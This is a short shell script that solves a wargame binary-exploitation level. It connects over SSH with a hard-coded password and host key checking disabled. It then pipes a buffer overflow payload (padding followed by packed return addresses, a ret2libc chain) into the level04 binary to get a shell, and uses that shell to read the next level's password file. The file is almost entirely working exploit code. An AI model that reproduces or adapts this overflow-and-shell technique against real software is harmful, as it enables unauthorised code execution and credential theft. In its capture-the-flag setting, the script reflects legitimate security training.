#!/bin/sh
PASS='kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf'
sshpass -p $PASS ssh -q -tt -o StrictHostKeyChecking=no level04@$OVERRIDE -p 4242 << EOF
SHELL=/bin/sh
rm /tmp/leve04
(python -c "print 'A'*156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\x5e\xf7' + '\xec\x97\xf8\xf7'"; echo cat /home/users/level05/.pass; echo pkill -9 level04) | ./level04 > /tmp/level04
echo -e "\e[32m\$(awk 'NR==1 {print; exit}' /tmp/level04)\e[39m"
exit
EOF